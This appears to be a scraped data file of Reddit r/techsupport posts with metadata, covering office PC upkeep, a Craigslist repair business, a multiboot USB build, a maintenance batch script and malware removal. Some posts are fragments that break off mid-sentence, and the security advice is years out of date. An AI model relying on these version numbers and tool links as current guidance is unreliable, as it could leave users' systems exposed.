I have no what idea what to do	iaskinternet	347	44	231	"insert (I have no idea what I'm doing.jpg) I work at a small business that does accounting. I get paid 9hr in California. They said my pay would increase 6 dollars an hour if I take care and maintain the computers!!!
Here is the problem, I agreed to take it, pretending I know what I am doing, butI know nothing about computers.

All I know is to use spybot search and destroy, malware bytes, ccleaner, microsoft security essentials, and the usual disk defrag, and disk clean up.

What are things that I can learn to maintain and protect 6 computers on a connected network before something goes wrong? How do I protect the network? How do I remove viruses? How do I protect financial records from getting out or getting hacked?

1351173283.0	122cw5	How to start being a computer repair technician off of craigslist.	Form84	345	57	146	"Hi There,

So I figured I should contribute to reddit or something and write maybe a quick guide on how to be successful as a craigslist computer repair technician.  

Quick background on myself.  4 years ago, my wife and I were really poor, I was unemployed, she was working a minimum wage job, we were BARELY paying the bills every month, and we needed to find a way to pay for things without paying $1200 a month for daycare.  So one day I decided to put myself out there on craigslist, and have learned many of these things as I've become successful doing it.  I started out doing this with literally a phillips screw driver and my home computer.  I now have a new car, an ipad I use solely for work, and all kinds of stuff, plus the ability to work from home, life is good. 
I help between 3-4 customers a day.
I work typically about 3 hours a day, on my own schedule.
I make about $150 a day on average.
The average cost of doing this is roughly $10-15 a day depending on your vehicle, ISP costs, etc.

Things you will need to start.
$30 to purchase tools. (tool recommendations below) Lots of guides will tell you to buy a big computer toolkit, but you really don't need that. You need 

1. PATIENCE, I cannot overstate this enough, this will make or break your business!
2. Your tools 
3. Cell-phone
4. Car (optional, increases your income potential by alot tho)
5. Mobile tools (if you have a car, pick up a cheap basic toolkit from a riteaid or something and just leave it in the car, you'll be surprised how often you use it)

Ok, so having read all that you have decided to be a craigslist repair technician, awesome!  If ya do it right, your life is gonna be awesome.  So here goes.

Pricing
-------------------------
People come to craigslist to get deals and to save some money, realize that when your writing your ad.  First lesson I learned pretty fast, is hourly rates DO NOT WORK. In the first two weeks of doing this, I initially charged $25 an hour, I got one customer in 2 weeks. Charge a flat rate!  
I charge a flat rate and plan on my jobs being fixed or resolved in under 2 hours.  My charge is what I expect to do for 2 hours of work.  So If you want to make $25 an hour, charge $50 to fix someones computer.  This is a HUGE undercut of store services or the Geek squad or staples, your making a great wage, and Saving people a TON of money! You will be absolutely surprised at how often you'll get jobs that take only 20-30 mins to fix, then you just made $50 for 20 mins worth of work!  Conversely tho, this is a #'s game, and you will run into jobs that end up taking for longer to fix than you originally planned.  PATIENCE!!! Doing this kind of work will earn you FUTURE MONEY, suck it up and DO IT, NO COMPLAINTS to the customer either, JUST FIX IT!  I've done screen replacements on unibody macbooks for $30 before, JUST DO IT!

If you have a car, your going to be making more money, you can now charge a gas surcharge!  Make it reasonable and this will become your bread and butter.  3/4's of what I do is on-site visits now a days, keep some dog treats on you when you go to new customers' houses, they'll freakin love you!

Writing Your Ad
-----------------------
Craigslist ads search off of the title and the body of the message.  Make sure to ad things like pc repair, mac, etc to the bottom of the ad to make sure it gets the most visibility.  Your ad will get flagged from time to time, and don't take it personally.  There are quite a few people who make their money off of craigslist and your now a competitor.  Have a good smartphone, get your email on your phone and repost the ad when it gets flagged, and THEY WILL GET FLAGGED.  Your ad can be reposted 5x a day before your account gets locked til the next day.  When someone flags your post, thats great, you just got to top post it for another at least 30 mins.  

It can be easy to develop flag and ad anxiety if this is your sole income, don't sweat it and just realize that these people are wasting more of their time than yours and enjoy the advertising ""reminder"".  

Keep your ad primarily in computer gigs, if possible also in the barter section if your willing to take trades.  I have gotten so many tools, tablets, mp3 players, movies, tv's, tattoos, etc from having my ad in the barter section it really pays itself off. Got paid in gold dust once, that was kind of cool!

Helpful software
--------------------------
Ninite - Ninite.com saves me so much time since I probably do a windows install EVERY SINGLE DAY.  People love getting free software and MANY of your customers don't know that the words Free and Antivirus can exist in the same sentence.  You handing out free copies of Microsoft security essentials and open office is like giving lil charlie a golden ticket to your customers!  
Rkill, TDSSKILLER, Malwarebytes, OTM, Gooredfix -  Common tools to remove viruses.  All very useful and can fix most ""viruses"".  There are tons of other alternatives to these, and use w/e your the most comfortable with, but I've found these are fast, lightweight, and easy to use for users, as many times I'll leave a copy with the customer to help themselves in the future.
WinToFlash - This will let you ""burn"" any version of windows to a bootable usb stick and install it from it, just like the CD.  Great laptops with broken dvd drives and netbooks, etc. 
Other things I keep around are common registry tweaks, like default_exe, taskmanager.reg, wallpaperenable.reg, InstallTake_ownership.reg, etc.



Key tips!
----------------------
1.  Your customers think of you in the same way that many people think of mechanics.  They don't trust you, they think your going to try to screw them over. You will have to prove through your words and your actions that you are worthy of trust.  Trust is your absolute best asset towards growing this kind of business.
2.  Many of your customers will be people that are FAR FAR FAR from literate with a computer.  Patience and GOOD customer service are FAR more important to the benefit of your business than your actual skill with the computer.  Patience will get you repeat customers!  Repeat customers are the heartbeat of what you do, NEVER take any customer for granted.  I helped a lady in a Starbucks once, she told her boss about me, I got a $1500 EMR contract to help migrate his dentist office to a new medical billing system.  
3.  Be realistic and DON'T scare people.  People don't want to hear ""You have 300x things wrong with your computer"".  They want to hear ""Oh, don't worry about that too much, I can fix it!""  You will become their go to computer guy for anything.  Be prepared to take phone calls and don't charge people for stuff like this.  If your willing to bend a little and help people out, they won't be afraid to toss money at you like it's setting their wallets on fire.  I once drove 30 miles to a guy's house to fix his WiFi only to find the WiFi switch was off, I didn't charge him and I've earned him as a repeat customer, and probably made $150 off of him over the course of a year.  If i didn't eat the initial visit, I don't know If he would've kept me around.
4. Be prepared to not make much for a while until your name gets out there.  Your reputation is WORTH WAY MORE THAN ANY SINGLE JOB! 
Do not take any job your not comfortable with, or don't think you can fix.  Be honest and upfront with people about expectations, and do your best to empower your customers to fix things themselves.  They'll trust you and pay you for the convenience!  Stand by WHAT YOU SAY, and be willing to go the extra mile for your customers, THEY WILL LOVE YOU!
5. Take pictures of your customers on your phone, and write a small note on their contact (if you have a smartphone) so that you can remember them and what you did for them.  You'll be helping lots of people every month and it can be very hard to remember them all, but people love knowing you remember them.
6. BE SAFE!  Write down any addresses to new customers and keep them around at your home if you don't know these people.  Let people know where your going.  You are dealing with people off of craigslist, yes most people are awesome, but be prepared for the crazies, which you WILL run into eventually. (yes, I Have crazy people stories)

Tools Recommendations
---------------------------
1. A precision screw driver set WITH HANDLES, do not get the skinny ones, you'll hate yourself for it.  Something like this is good. 
http://ecx.images-amazon.com/images/I/41PADNxaDfL._SL500_AA300_.jpg
2. A set of normal steel-shafted screwdrivers.  Stanley has a great set of steel-shaft screwdrivers with an interchangeable handle (not head).  Cost like $10
3. A solder gun (if you know how, this can increase the variety of jobs you can take) $7 at radio shack. $3 for solder. 
4. An anti-static wristband is typically about $5-7 and is easiest to find in one of those computer toolkits, but can easily be ordered off of amazon also.  
5. A can of compressed air
6. A tiny flashlight of some kind. No, your phone is not good enough, Go buy a $1 TINY flashlight that you can hold in one hand without having to mess with touchscreens, it will instantly become your favorite tool.
7. At minimum a 4gb flash drive. That you can keep on your keychain.

Ok, thats all I can think of for right now.  I'll answer any questions anybody has, and best of luck all of you!

I'm not going to link examples right now because I don't want to call out anyone in particular, but in one case an idea was suggested by someone as a fix, was a TERRIBLE idea to fix the issue, and then the person who suggested the fix said ""oh, sorry, i never used those before I didn't know.""

There is so much crap in this subreddit that is going to really steer people in the wrong direction...and most of the garbage gets upvoted unless someone who really does know what they're talking about has to call them out for their crap.

"	dinosours	229	52	158	"Hello /r/techsupport. My husband was a software engineer. He was fatally shot and killed at a super bowl party, early Monday morning. There are photos, bank information, emails with account numbers for insurance issues and so much more on his work laptop. Unfortunately he has a password on that and so far the only answers I've received for being able to access this laptop is that they would have to essentially erase everything. I am technologically challenged (Just learned how to check my voicemail on my cell phone yesterday for the first time) so I wanted to get your opinions on this. 

Is there absolutely any way that I would be able to access his laptop without erasing everything? At a bare minimum all of our family photos are stored on either his, or our shared laptop (which I don't have access to his account on either) The insurance things and bank issues are things that I will likely be able to solve without but it will be a pain. Mostly I would just be devastated to see years worth of these photos lost. Also, we have external hard drives laying around that supposedly have photos and videos and god knows what. I have no idea how to use these things. Basically I'm just a wreck and never planned to not have him around to solve these issues so I really don't know where to begin with all of technology things around the house but these laptops seem like a good place. Thank you so much. 

Edit- Thank you so much for the help so far. I originally came here in a panic after being informed by several people that in order to access the laptops I would need to erase essentially everything. At this point I have accessed his account on our shared laptop and been able access hundreds of photos that I thought might be lost forever. And his work has volunteered to help access anything they can through his work laptop. 

At this point the only minor issue I'm having a prompt on his account saying something about a verification pin that is needed. I'm not sure what that is or if it's even important. Any help on that one would be nice, although it might be something unimportant. I don't know. "	t5_2qioo	True

1330653703.0	qdugd	I have found this extremely helpful in many situations - Hiren's Boot CD	_Exaybachay_	182	17	56	"[Hiren's Boot CD Website](http://www.hirensbootcd.org/)

Hi everyone,

I see that there are many helpful, kind, and talented techs here doing a great job of solving many problems, so I am hoping to launch a pre-emptive strike of helpfulness :P  

First a quick background - I have worked with IT for about 7 1/2 years now professionally (1 1/2 teaching) so I've seen many BSODs, password resets, Outlook errors (control+right-click on the taskbar icon is a miracle worker), and just about any other help desk, family emergency, server, and network type issue you can imagine.  

That said, here is why I recommend you add Hiren's to your toolkit immediately:

1. Hiren's is free (as in beer)

2. It is loaded with all kinds of helpful apps.  I like to call it the Swiss army knife of troubleshooting.  Check [here](http://www.hiren.info/pages/bootcd) to see some of the awesome apps it has.  For starters, you have: 

* Multiple Antivirus/Antispyware/Antimalware/AntiRootkit apps 
* A few file recovery apps for when you accidentally delete data (I used Recuva to recover approx 1TB of data for a friend)
* Many backup applications
* Troubleshooting utilities like ""The troubleshooter"", memtest, Maxtor PowerMax and WD Data Lifeguard, etc etc

3. You boot from it, and not Windows.  This means no issues with BSODs, and you don't have to worry about viruses running in the background.  Ridding yourself of viruses and spy/ad/malware becomes much easier with this tool.

4. I mentioned ridding yourself of viruses above - in my opinion the best way to prevent that issue in the first place is to do regular backups of your data (terabyte drives are going down in price) and use Hirens to create an image of your newly installed OS.  Using Hiren's, do the following: 

* Back your data up
* DBAN the computer
* Install your OS of choice 
* Create a second partition of about 40 Gigs to be safe (this will store your OS and any apps that you want to have installed)
* Create an image with Clonezilla or Ghost.  

Congratulations, now repairing your PC when/if you get a virus is as easy as restoring your image!

5.  You can boot to ""Mini Windows"".  Now you don't need to fumble around in DOS, trying to figure out why NTLDR is missing - you can just boot to Mini Windows and run the NTLDR fix app.

6.  There are really too many examples of why Hiren's is helpful to list here, but hopefully you get the idea.  Hiren's is a tool that empowers you, the user, and anyone else that you give a copy to.  I personally know many friends and family members that have thanked me profusely because of how easily they were able to boot Hirens and fix their pop up issues, or troubleshoot a failing memory stick.


So anyways, I hope you found that helpful.  If you have any questions I would be happy to address them.

EDIT: Thanks to everyone who checked out this post and provided helpful tips and conversation - as you may have noticed from the formatting nightmare above I am quite new to posting on Reddit (just over a day now).  

I will be around this subreddit to help out though, so hopefully you all will see more posts of a similar nature from me in the not too distant future (free software I think will be my next goal).  I've gotta get to bed for work tomorrow, but I did want to say thanks again, I never expected to see 60 upvotes so quickly :D"	t5_2qioo	True

1373604491.0	1i4u3p	A Warning about the Geek Squad	KurtofAllTrades	200	36	259	"Not sure if this goes here, if it doesn't please point me to where it should go.

Anyways, with all the recent upset with Best Buy and people posting their stories, i'll post mine that happened recently here which stands as a testament of why you should be wary of the Geek Squad.

Last year I bought a laptop for college, I then bought the Geek Squad Black Tie protection on it as they would fix anything I had issues with over the next 3 years. A week after this, I bought a seperate hard drive and installed it alongside the HDD that came stock (it has 2 HDD Bays) 

So anyways, fast forward a year and after it's first year of use it got sent back to the Geek Squad to repair a sound card issue and a few other minor problems. 

I send it in, get a call saying one of my HDDs is bad and needs to be replaced (odd) so I ask which one, they confirm it was the stock one that comes with the laptop, not the aftermarket. So I give them permission to remove THAT one. 

Once I received my laptop, upon bootup, I noticed they uninstalled my Windows 8, odd because the OS was on my personal HDD. Upon looking at the drives, I had a C drive with 373GB of storage, and a D Drive with 350GB of storage. (I had a 1TB and a 750GB before) so I check disk management and find out that I only had one HDD partitioned to look like I had 2 of them. 

Off to Best Buy we go, I wait my turn patiently, go up to the counter and say that I received my laptop after repair and my personal hard drive was missing from the computer. The employee's response? ""What do you want me to do about it"", we had to get the supervisor over and went through the entire scenario, they told us to check back in 3 days.

5 days down the road I get a call from Best Buy, the person said ""So you want the data recovery on this hard drive right?"", completely annoyed by now, I exclaimed ""NO! I WANT MY HARD DRIVE BACK"", they claimed it was against company policy, so I had to explain I never gave them permission to remove that hard drive. After that, I got the ""Oh.... we are going to have to look into this"" message, and 5 days later again I get the phone call saying they screwed up and are now shipping the hard drive to the store where I could pick it up.

Finally after 2.5 weeks I received my personal hard drive. 

I would give them the benefit of the doubt but then why was my remaining hard drive partitioned to look like 2 hard drives? That leads me to believe they screwed up / attempted to steal it, and tried to cover their tracks. Imagine how many more people are victim of these scenarios and just aren't able to recognize this? A missing gig of ram, who will notice, understand what i'm getting at here. Even if it weren't stolen, it is possible that components might go missing through negligence which is possibly what happened and someone who isn't tech savvy would never notice.

Anyways, I hope my story makes people worry about their computer with best buy, and that they will always check to make sure they aren't being screwed over. "	t5_2qioo	True

1326486575.0	ofvv2	My USB drive. Contains rescue tools, persistent Ubuntu environment and Windows 7 universal installer.	HittingSmoke	183	22	75	"EDIT 1/14: **Clarification:** The ISO you're writing directly to the drive in step 11 is a Linux live environment. It should work with any Debian based live distro that supports persistence. I used Ubuntu 10.04 LTS so I don't have to worry about future upgrades as often.

EDIT 1/13: ~~For the lazy, [here's an image of the drive](http://www.reddit.com/r/techsupport/comments/ofvv2/my_usb_drive_contains_rescue_tools_persistent/c3h1q5r). It's not confirmed working by anyone, and a torrent was the only option for distribution.~~ Once I have the complete 32GB version created I'll make proper images for both 16 and 32GB sizes with proper uploads. **My image got corrupted in my VM before I could seed it to 1.0. ~~I'll get a new one up ASAP.~~ I'm not going to make another image until I get the 32G drive working. I may look like I've abandoned this but I haven't. I'm just very busy.**

----

I thought I'd write up a quick little run down on how to do this, since it took me about two weeks of tinkering and reading to get this working right and no one around here seemed to know the answers to my questions when I asked.

**The problem:** There are many many tools for creating multi boot USB drives. Not a single one I could find supported persistent environments. Creating a persistent environment then adding things like Trinity or UBCD to GRUB was rather trivial, but I also wanted a Windows 7 installer and recovery console. This is not so trivial it seems.

**My finished solution:** What I ended up doing was creating a separate partition at the end of the drive and copying the ISO contents for fast booting into my persistent environment. Then I created a FAT32 partition at the beginning of the drive to install other bootable environments on using YUMI. I created a universal Win 7 installer using WinAIO for YUMI to install on my drive removing the issue of tweaking GRUB or syslinux manually to get a Windows install to boot.

This guide assumes a bit of technical knowledge and that you know your way around the Linux CLI.

##Skip to here for the actual instructions. You'll need at least a 16GB drive to mirror my exact setup.

###First things first: Get your Win 7 universal ISO set up.

1. Download the Windows 7 [x86](http://msft.digitalrivercontent.net/win/X17-59463.iso) and [x64](http://msft.digitalrivercontent.net/win/X17-59465.iso) ISOs. (These downloads are from Digital River who officially contracts with MS. These downloads are as safe as you can get without purchasing a copy).

2. Download [WinAIO](http://forums.mydigitallife.info/threads/29178-WinAIO-Maker-Professional-The-All-in-One-Windows-Setup-Solution).

3. Click the AutoAIO button in the lower right corner.

4. Select a target folder where you'd like your ISO to be saved to in the first box. Select the X86 (59463) and X64 (59465) ISOs in their respective boxes and choose `Enable x64 recovery mode`.

5. Click Start Compilation.

What you should be left with is an ISO that when booted will allow you to choose any version of Windows 7 from Starter to Ultimate in 32 or 64 bit formats, except where they're not available (there is no 64 bit version of Starter edition). This also includes the EU versions that ship without WMP, denoted by an N after the name.

Set that ISO aside for now, it's time to format your USB drive and work on your persistent install.

###Formatting your USB drive:

I did this using the Linux CLI in an Ubuntu VM because it's faster for me. It's possible to do using Windows tools but I'm going to stick strictly to the instructions I've tested personally. If someone would like to make a Windows version of this, feel free.

I did this using Ubuntu 10.04 LTS.

1. With your drive plugged in, run `sudo fdisk -l` and find your USB drive. For this guide we're going to assume it's `/dev/sdb`

2. Run cfdisk to partition the drive. `sudo cfdisk /dev/sdb`

3. Delete all partitions. Create a new primary partition at the beginning of the drive using the entire drive minus 730MB.

4. Create a new primary partition using the remaining space.

5. Select the larger partition and set it to type FAT32 (option 0C)

6. Write the new partition table and quit.

7. Format the first partition as FAT32: `sudo mkfs.vfat -F 32 -c /dev/sdb1`

8. Mount the newly formatted partition: `sudo mkdir -p /media/USB` then `sudo mount /dev/sdb1 /media/USB`

9. Create your persistent file to save changes. `sudo dd if=/dev/zero of=/media/USB/casper-rw bs=1M count=4095`. 4095 being the size of the persistent file in MB. You can set this to whatever you like under the 4GB FAT32 file size limit depending on the size of your drive.

10. Create a file system in your persistent file. `sudo mkfs.ext4 -F /media/USB/casper-rw`

11. Write your (Linux live distro) ISO image to the extra partition. `sudo dd if=/path/to/iso.iso of=/dev/sdb2`. This will take a while.

Now that your drive is set up, we need to back up a few files. These instructions are for moving files out of the ISO to the FAT32 partition. After extracting them you need to back them up elsewhere. Your FAT32 partition is going to be formatted again when we get back to Windows.

1. `sudo mkdir -p /mnt/iso`

2. `sudo mount -o loop /path/to/iso.iso /mnt/iso`

3. `cp /mnt/iso/casper/{vmlinuz,initrd.lz} /media/USB/`

4. `sudo umount /mnt/iso`

5. `sudo rmdir /mnt/iso`

Before pulling the USB drive from the Linux machine or VM, run `sync`.

Now go back to Windows and copy `casper-rw`, `vmlinuz` and `initrd.lz` to your HDD for safe keeping. You're going to need them later.

###Creating your YUMI drive:

1. Download and start up [YUMI](http://www.pendrivelinux.com/yumi-multiboot-usb-creator/).

2. Select your USB drive letter from the pulldown menu.

3. Scroll to the bottom of the list and choose *""Windows Vista/7 Installer""*. Find the ISO you created with WinAIO and click *Create*.

4. After this operation is complete, find where you saved your casper-rw, vmlinuz and initrd.lz files. Copy casper-rw to the root of the partition and vmlinuz and initrd.lz to /boot.

5. Download GRUB.exe from [here](http://www.icpug.org.uk/national/linnwin/step1-9x.htm) and save it to /boot/grub.

6. Create a new file in /boot/grub named menu.lst with the following contents:

        default		0
        timeout		0

        title		Ubuntu 10.04
        root		(hd0,0)
        kernel		/boot/vmlinuz boot=casper file=/preseed/ubuntu.seed persistent
        initrd		/boot/initrd.lz

7. Find `syslinux.cfg` in the multiboot folder in the root of the drive and open it in a text editor. Add the following after the `label Boot from first Hard Drive` entry: (Not directly after that line, but after the `MENU DEFAULT` line in that block of text)

        label Ubuntu
        KERNEL /boot/grub/grub.exe
        MENU INDENT 1
        APPEND –-config-file=/boot/grub/grub.cfg

After saving these two files, you should have a functioning bootable USB drive that will boot any Windows 7 installer, plus a persistent Ubuntu environment that you can install packages and save system setting changes on.

Reboot with the USB drive in to test it out. Boot into your Ubuntu environment and create a file on the desktop. Reboot back into the Ubuntu environment to make sure it stuck. After you've confirmed your persistence is working properly, boot into the Windows installer and make your way through until you get to the HDD partition screen to make sure that's working as intended as well.

After you've confirmed that the basics are working as they should, you can use YUMI to install other ISOs that will be automatically added to the menu. I'm running Hiren's, UBCD, Trinity Rescue Kit, Backtrack 5 and Kaspersky's bootable AV. Don't bother with things like Kon-boot or memtest86 in YUMI if you have a rescue environment loaded up. They render them redundant.

If you don't like the segregated menus like me, you can open up your /multiboot/syslinux.cfg file to customize it. If the menu entry isn't in the main menu it will point to the config file containing it.

For example, if you want the Windows 7 installer on the main menu instead of under ""Other operating systems"", open /multiboot/menu/other.cfg. Find the block of text that starts with `label Windows Vista/7 Installer` and copy it over to where you'd like in syslinux.cfg. I edited the label on mine to read ""Windows 7 Installer"" to more accurately reflect what it's booting.

Once I find a good deal on a 32GB drive I'll be adding Windows Vista and Windows XP installers as well. The rest of the space on my drive is taken up with service pack redistributables and various tools installed using LiberKey.

I'll be adding all this info to the wiki along with my LiberKey tools and updating that when I make changes or upgrades to my drive, including source links to the various guides that helped me put this together.

**Note: I'm aware there are some redundant steps here as well as some skipped shortcuts that would save time. The simple fact of the matter is, this is what I did and it works. I don't want to alter the guide in a way which I've not tested yet. When I put together v2 of my drive with bootable Vista and XP installers I'll experiment with condensing this into fewer steps and add it to the wiki in the sidebar.**

The machine is still working so I was able to check for previous reports and they aren't good: everybody who has seen this message pop up during the BIOS update has been unable to reboot the system.  No post codes, no bios entry screens, no nothing - just black screens on power up.  Toshiba has been receiving these reports for many months now but continue to actively notify people that they should flash their BIOS.

So far I've gone through only round one of phone calls to get this fixed.  I called Toshiba's Customer Support Center (800-457-7777) and was given a case number and told to call Toshiba Repair Services at 800-438-3910 because the first center couldn't help me.  Other people have reported that shipping was expected to be picked up by the end user, time will tell what they will require from me.

I have made the following websites:

http://www.ismyflashworking.com

http://www.ismysilverlightworking.com

http://www.ismyjavaworking.com

If the user does not have javascript enabled, they will get a warning and a link to a guide on how to enable javascript. I've been using the sites myself for quite a while now, but thought it would be nice to share :)

I plan on adding a troubleshoot-button to each page as well in the near future, with information on how they might reinstall/fix installations of flash/java/silverlight.

1316696799.0	knux0	I scripted an automated computer repair for technicians.  Looking for feedback.	sethar	156	15	58	"***UPDATED 10-22-2011***

Every time we fix/maintain computers, we tend to do the same thing – Run chkdsk for errors, install the latest plugins, clean out the temp files, run anti-virus, run anti-malware, defragment the hard drive, and reboot the computer.  It’s a tedious task because you have to keep going back to the computer over and over again to click “next” to move on to the next install or next scan.  

I geeked out a little last night and wrote a script that does (almost all of) this all automagically.  I’ve tested it on Vista 32 bit with UAC enabled, XP 32 bit, and Windows 7 64 bit.  What this script currently does is as follows:  

(**Bold = requires user interaction**)  

1. Creates a log file at C:\routinelog.txt and begins logging.  Purges existing log if there is one.
2. Checks to see if your OS is 32 bit or 64 bit and continues accordingly.
3. Strips out common crapware:  Bing Toolbar, Google Toolbar, Ask.com Toolbar, OnLine TV Toolbar, Yahoo! Toolbar, WeatherBug, McAfee Security Scan Plus, and Norton Security Scan.  
4. *Requires Internet Access* Installs the latest Flash for all browsers, Silverlight, Air, Java, Shockwave, CCCP Codecs, Acrobat Reader, QuickTime, .NET framework, and MalwareBytes.
5. Runs chkdsk.  If errors are found, it schedules a repair on next reboot.  If no errors are found, it moves on.
6. Starts CCleaner to do an automatic cleaning of temp files, temp internet files, “intelligent cookie scan”, etc. *(see edit below)*
7. Launches Defraggler to automatically defragment the C: *(see edit below)*
8. Checks for Microsoft Security Essentials.  If it finds it, it automatically runs a definition update and a full scan.  If not, it moves on.
9. Starts a malwarebytes full scan.  **When this completes, you need to manually select which files you want to clean.  If it asks to reboot, say NO.**
10. Deletes the Reader, QuickTime, and Media player Classic desktop shortcuts that were created during the plugin install.
11. Uninstalls Defraggler, CCleaner, and MalwareBytes so the newest versions are downloaded the next time this script runs.
12. Reboots.  


Just extract the folder and double click on routine.bat to start the process. **Edit:**  If you are not on an administrator account you should right click on the bat and say ""Run as Administrator"".  

If you want it to automatically install Microsoft Security Essentials so that it will scan in Step 8, replace ninite.exe with a version that includes downloading MSE.  

Since this currently uses the free version of ninite and malwarebytes I cannot completely automate the process, hence the user interaction on step 9.  The free version license agreement of ninite and malwarebytes is for personal use only.  

You can download my utility here (Latest v 1.9):  [Clicky](http://www.mediafire.com/?87bbda95mmq7duv)  

I'll probably clean it up or find another way later, but it seems to work pretty well...just don't run it on a computer that has a paid version of MalwareBytes on it!  

**EDIT:**  I have updated to 1.9, which has the 1.8 fix (ccleaner and defraggler no longer on ninite, so they are included in the folder).  1.9 also includes deletion of common toolbars and crapware:  Bing Toolbar, Google Toolbar, Ask.com Toolbar, OnLine TV Toolbar, Yahoo! Toolbar, WeatherBug, McAfee Security Scan Plus, and Norton Security Scan.  I've only tested it with the most current downloadable versions.

**Please note, Norton has no silent uninstaller so I have to forcefully delete files &amp; registry keys.  This will decimate all norton software if both norton security scan AND a legit norton AV product are on the same machine -- Proceed with caution.  If you delete the ""%PROGRAMFILES%\Norton Security Scan"" folder from the machine before running this script - Or manually uninstall Norton Security Scan, the Norton cleanup portion of my script will not run.**"	t5_2qioo	True

Before starting, if your data is valuable, **back it up**. It is ok if you backed up the malware, if worse comes to worst your operating system breaks and the computer needs to be reformatted you'll just need to install Microsoft Security Essentials or another solid antivirus BEFORE plugging your backup media back into the computer and the AV should filter any viruses. I recommend [disabling autoplay in Windows](http://support.microsoft.com/kb/967715) to prevent any infections and to also scanning the drive with [Malwarebytes Anti-Malware](http://ninite.com/malwarebytes/) before transferring.


**Symptoms of an infection**

Symptoms of malware infection range from being nearly undetectable (keyloggers) to blatantly obvious (An application that calls itself ""Vista Anti-Spyware 2012"" should sound a little suspicious).

* Security applications such as the users antivirus and firewall are disabled or fail to update.
* New programs the user doesn’t remember installing appear.
* A generic antivirus program claiming the system is infected and asking for money.
* A failure to boot in the form of either a black screen with a message about a corrupt file or the blue screen of death (BSOD) usually 0X000007B, sometimes 8a.
* The computer is slow, processor and memory usage are near full even with no applications are running.
* The user tries to browse or make a search query and is rerouted to a suspicious site.
* There are some fake antivirus variants I have seen that claim your hard drive is failing. Don't trust anything that you haven't researched. I recommend running [a real test of your hard drive](http://www.hitachigst.com/support/downloads/#DFT) if you suspect there are also hard drive issues (symptoms include slow responses, freezing, crashing, loss of internet connectivity, etc) - If this test fails you simply need to backup your data, replace the hard drive and reinstall the operating system from your recovery discs (or replacements from your manufacturer), then restore your data.


**Tools**

Please download these programs and stick them on your desktop or an easily accessible folder 

* [rKill](http://download.bleepingcomputer.com/grinler/rkill.com)

* [CCleaner](http://www.piriform.com/ccleaner/download/portable/downloadfile)
* [Combofix](http://download.bleepingcomputer.com/protected/d11a155c8fca84d005f106d9810f6464/4d19f694/ComboFix.exe)

**Step 1: Safe Mode**

Boot into Safe Mode with Networking by pressing F8 repeatedly during bootup. This should bring up a menu that looks like [this](http://www.pcfeeder.com/images/stories/W7_BootIntoSafeMode/SafeMode_7.png). Select ""Safe mode with Networking""



**Step 2: Run [rKill](http://download.bleepingcomputer.com/grinler/rkill.com)**

This should kill any malware processes that are still active, it'll generate a text file log which will list what it kills. It may kill any HP printer startups and some harmless items, those are fine, however if you see things like dwm.exe it's likely malware (note dwm.exe is a legitimate Windows Vista/7 file used to provide Aero transparency effects, but the malware calls itself the same so the OS points to the infected file instead of the real one).



**Step 3: Run [CCleaner](http://www.piriform.com/ccleaner/download/portable/downloadfile)**

This will remove temp files where some some of the malware reside.




**Step 4: Run [Combofix](http://download.bleepingcomputer.com/protected/d11a155c8fca84d005f106d9810f6464/4d19f694/ComboFix.exe)**

Follow [This guide](http://www.bleepingcomputer.com/combofix/how-to-use-combofix) on how to use Combofix. NOTE THAT COMBOFIX WILL TSA YOUR COMPUTER AND MAY IN RARE CASES BREAK YOUR OPERATING SYSTEM-PROCEED WITH CAUTION-OTHERWISE OPT-OUT AND GO TO STEP 6.
Combofix now also supports 64-bit operating systems! =)




**Step 5: Reboot and boot into Safe Mode [F8 key at startup] Again**

You will need to reboot after Combofix completes otherwise .exe files won't run.




**Step 6: Install and run [Malwarebytes via Download.com](http://download.cnet.com/Malwarebytes-Anti-Malware/3000-8022_4-10804572.html?part=dl-10804572&amp;subj=dl&amp;tag=button)**

This is pretty straightforward, simply install it, update it, and run a full scan of the OS. This may take up to a few hours depending on your system.



**Step 7: Check your Antivirus and do a Full scan**

If you have an expired antivirus that came with your computer or you don't trust the one you have, I recommend downloading and installing Microsoft Security Essentials, it's free and has pretty good detection rates, however AV-test.org in Q1 gave it a pretty low detection rating. MSE 2.0 won't catch everything, but keep in mind no antivirus is, and none of them can make up for safe surfing habits and updates to plugins and the operating system. If you want more protection, you could support the developers and buy a full copy of Malwarebytes which includes the real-time protection components. If MSE isn't your cup of tea (it will take a lot of RAM and slow down the older gen netbooks that have &gt;=1GB of RAM) you can try any of the other AV's offered out there. For the free ones I recommend Avira followed by AVG. In terns of paid protection, Kaspersky is a well recognized and well respected AV, personally if I had the money to spend I'd use it (note that its very paranoid but it will keep your computer pretty safe).



**Optional: Run another Second Opinion Scanner**

* [Hitman Pro](http://www.surfright.nl/en/downloads/)

* [SuperAnti-Spyware](http://www.superantispyware.com/downloadfile.html?productid=SUPERANTISPYWAREFREE)

* Some people suggest Ad-Aware and Spybot. We can party like it's 2004 or use programs that actually remove malware. I view those as old-gen tech that had their glory days and no longer have what it takes to protect the computer. If you or whoever you are helping feels they provide an extra sense of security there's no harm in installing them (note however that on older machines they may just take up more RAM and slow the system down).



**Step 8: Network Settings Reset**

The Network Settings Reset tool will remove any hardcoded IPs, DNS redirects, proxies that the virus may use. 


**Step 9: Change your passwords!**

There are some nasty trojans out there like zBot which will steal your passwords, credit card numbers, etc and send them off to people in other countries, these people are interested in the redistribution of your wealth (or lack thereof). If you paid the fake antivirus with your credit card, cancel the card. As a precaution I would recommend changing your login passwords, make sure they have characters with at least one lowercase, uppercase, symbol, and number, for a good guide check out this [XKCD comic](http://xkcd.com/936/).
Don't use the same login username and passwords for every site If they found your gmail username and password perhaps you use it for your PayPal or Amazon account as well.


If you are sure you have been a victim of ID theft please visit [The FTC's site on ID theft](http://www.ftc.gov/bcp/edu/microsites/idtheft/) for assistance.



**Step 10: Secure your Computer**

Make sure you run Windows Update and the latest service packs are installed and your firewall is enabled, the Antivirus is updating and not expired, Make sure Firefox/Java/Adobe/Flash are updated, if not, run the individual installers or batch install them using [Ninite](http://ninite.com).

To see which version of the programs you have simply go to Start (orb) | Run | type ""appwiz.cpl"" which will take you to the Add/Remove panel (Program and Features in WinV/7)

**Programs and Plugins with Security vulnerabilities**

* Java: Version 6 Update 32 (as of 6/
* Adobe Reader: Version 10.x
* Adobe Flash: 10.x

Anything short of Java version 7 (eg version 6 update 26 is probably going to get you reinfected, as each new version patches multiple vulnerabilities discovered in the previous version).

For a complete list of what needs updating run the [Plugin Check](http://www.mozilla.com/en-US/plugincheck/) for all browsers.

**Windows Service Packs**

